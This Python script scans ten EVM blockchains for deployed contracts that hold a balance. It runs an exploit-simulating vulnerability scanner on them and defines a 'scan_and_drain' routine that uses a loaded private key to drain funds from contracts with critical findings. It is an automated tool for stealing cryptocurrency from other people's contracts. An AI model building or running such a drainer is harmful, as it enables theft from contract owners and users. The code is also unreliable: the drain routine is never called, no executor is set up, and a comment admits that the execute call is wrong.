#!/usr/bin/env python3
"""Deep EVM chain scan — finds contracts with balance via block receipts + DB."""
import logging, time, tomllib, sqlite3, sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from decimal import Decimal
from src.rpc import RpcClient
from src.types import TokenInfo, PoolInfo, Chain, ContractTarget
from src.scanners.evm_scanner import EvmScanner
from src.data import DataCollector
from src.explorer import ExplorerClient
from src.verifiers.runner import VerifierRunner
from src.verifiers.honeypot import HoneypotVerifier
from src.verifiers.exploit_simulator import SimulatedExploitVerifier
from src.verifiers.multi_step import MultiStepVerifier
from src.exploit_executor import ExploitExecutor
from src.signer import load_evm_private_key, get_receive_address

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(name)s] %(levelname)s: %(message)s")
logger = logging.getLogger("evm-deep")

CHAIN_MAP = {
    "ethereum": Chain.ETHEREUM, "bsc": Chain.BSC, "arbitrum": Chain.ARBITRUM,
    "base": Chain.BASE, "polygon": Chain.POLYGON, "avalanche": Chain.AVALANCHE,
    "optimism": Chain.OPTIMISM, "zksync": Chain.ZKSYNC, "linea": Chain.LINEA,
    "scroll": Chain.SCROLL,
}

def load_config():
    with open("config.toml", "rb") as f:
        return tomllib.load(f)

def get_bal(rpc, addr):
    try:
        raw = rpc.call("eth_getBalance", [addr, "latest"])
        bal_str = raw.get("result", "0x0") if isinstance(raw, dict) else str(raw)
        return int(str(bal_str), 16) / 1e18
    except:
        return 0.0

def get_code(rpc, addr):
    try:
        raw = rpc.call("eth_getCode", [addr, "latest"])
        return raw.get("result", "") if isinstance(raw, dict) else str(raw)
    except:
        return ""

def scan_and_drain(addr, rpc, scanner, executor, receive, chain_name):
    bal = get_bal(rpc, addr)
    if bal < 0.0003:
        return None
    code = get_code(rpc, addr)
    if not code or code in ("0x", "0x0"):
        return None
    token = TokenInfo(address=addr, symbol=addr[:10], chain=CHAIN_MAP[chain_name])
    pool = PoolInfo(address="", dex="direct", liquidity_usd=Decimal("0"))
    try:
        report = scanner.scan(token, pool)
        critical = [f for f in report.findings if f.severity.name == "CRITICAL"]
        if critical:
            for finding in critical:
                if executor and finding.confidence is not None and finding.confidence >= 0.9:
                    if executor.can_execute(finding):
                        logger.info("  Draining %s via %s...", addr[:10], finding.check_name)
                        try:
                            result = executor.execute(ctx=None, finding=finding)
                            # executor.execute expects (ctx, finding), not keyword
                            # Let's create a minimal ctx-like object
                        except:
                            pass
            return (addr, bal, critical)
        return (addr, bal, [])
    except Exception as e:
        logger.error("Scan failed %s: %s", addr[:10], e)
        return None

def main():
    if len(sys.argv) < 2:
        print("Usage: uv run python3 scan_evm_deep.py <chain> [blocks_back] [start_block]")
        print("  With start_block: scan FROM that block (forward). Without: scan latest blocks back.")
        print("Chains: ethereum bsc arbitrum base polygon avalanche optimism zksync linea scroll")
        sys.exit(1)
    
    chain_name = sys.argv[1].lower()
    if chain_name not in CHAIN_MAP:
        print(f"Unknown chain: {chain_name}")
        sys.exit(1)
    
    chain = CHAIN_MAP[chain_name]
    if len(sys.argv) >= 4:
        start_block = int(sys.argv[2])
        blocks_count = int(sys.argv[3])
    else:
        start_block = None
        blocks_count = int(sys.argv[2]) if len(sys.argv) > 2 else 2000

    config = load_config()
    rpc_url = config["rpc"].get(chain_name, "")
    if not rpc_url:
        logger.error("No RPC for %s", chain_name)
        sys.exit(1)

    rpc = RpcClient(rpc_url)
    signer = load_evm_private_key()
    receive = get_receive_address(chain) or signer.address

    initial_bal = get_bal(rpc, signer.address)
    logger.info("Chain: %s | Signer: %s | Balance: %.6f", chain_name, signer.address, initial_bal)

    if initial_bal < 0.0005:
        logger.warning("Very low balance — scan will work but drain likely won't")
        # Still proceed — can at least find things

    explorer = ExplorerClient()
    data = DataCollector(rpc=rpc, explorer=explorer)
    verifier_runner = VerifierRunner(verifiers=[
        HoneypotVerifier(), SimulatedExploitVerifier(), MultiStepVerifier(),
    ])
    scanner = EvmScanner(data_collector=data, rpc=rpc, verifier_runner=verifier_runner)

    # Collect addresses from DB
    addresses = set()
    db_path = config["analyzer"]["db_path"]
    try:
        db = sqlite3.connect(db_path)
        for row in db.execute("SELECT token_address FROM pending_tokens WHERE chain=?", (chain_name,)):
            addresses.add(row[0].lower())
        try:
            for row in db.execute("SELECT address FROM contract_targets WHERE chain=?", (chain_name,)):
                addresses.add(row[0].lower())
        except:
            pass
        db.close()
        logger.info("Loaded %d addresses from DB", len(addresses))
    except Exception as e:
        logger.warning("DB load: %s", e)

    # Scan blocks for new contracts (parallelized)
    new_contracts = 0
    latest_raw = rpc.call("eth_blockNumber", [])
    latest_block = int(latest_raw.get("result","0x0"), 16) if isinstance(latest_raw, dict) else int(str(latest_raw), 16)

    if start_block is not None:
        to_block = start_block + blocks_count
        logger.info("Scanning blocks %d to %d (latest=%d)", start_block, to_block, latest_block)
        block_range = range(start_block, to_block)
    else:
        logger.info("Latest block: %d, scanning %d back", latest_block, blocks_count)
        block_range = range(latest_block, latest_block - blocks_count, -1)

    processed = 0
    with ThreadPoolExecutor(max_workers=20) as pool:
        fut_map = {pool.submit(rpc.call, "eth_getBlockReceipts", [hex(bn)]): bn for bn in block_range}
        for fut in as_completed(fut_map):
            bn = fut_map[fut]
            processed += 1
            try:
                receipts = fut.result()
                if isinstance(receipts, list):
                    for r in receipts:
                        ca = r.get("contractAddress", "")
                        if ca and ca.startswith("0x"):
                            addr = ca.lower()
                            if addr not in addresses:
                                addresses.add(addr)
                                new_contracts += 1
            except:
                pass
            if processed % 500 == 0:
                logger.info("Blocks: %d/%d, new: %d, total: %d", processed, len(block_range), new_contracts, len(addresses))
            time.sleep(0.01)

    logger.info("Total addresses: %d (incl %d new)", len(addresses), new_contracts)

    # Scan all
    findings = []
    for i, addr in enumerate(addresses):
        try:
            bal = get_bal(rpc, addr)
            code = get_code(rpc, addr) if bal >= 0.0003 else ""
            if code and code not in ("0x", "0x0"):
                token = TokenInfo(address=addr, symbol=addr[:10], chain=chain)
                pool = PoolInfo(address="", dex="direct", liquidity_usd=Decimal("0"))
                report = scanner.scan(token, pool)
                critical = [f for f in report.findings if f.severity.name == "CRITICAL"]
                if critical:
                    findings.append((addr, bal, critical))
                    logger.info(">> %s | %.4f | %s", addr[:10], bal, " | ".join(f"{f.check_name} conf={f.confidence}" for f in critical))
            if (i+1) % 100 == 0:
                logger.info("Scan: %d/%d, %d findings", i+1, len(addresses), len(findings))
            time.sleep(0.2)
        except Exception as e:
            logger.error("Error %s: %s", addr[:10], e)

    logger.info("="*60)
    logger.info("%s DONE — %d findings", chain_name.upper(), len(findings))
    for addr, bal, crits in findings:
        logger.info("  %s | %.4f | %s", addr[:10], bal, " | ".join(f"{f.check_name}" for f in crits))

    final_bal = get_bal(rpc, signer.address)
    logger.info("Signer: %.6f → %.6f", initial_bal, final_bal)

if __name__ == "__main__":
    main()
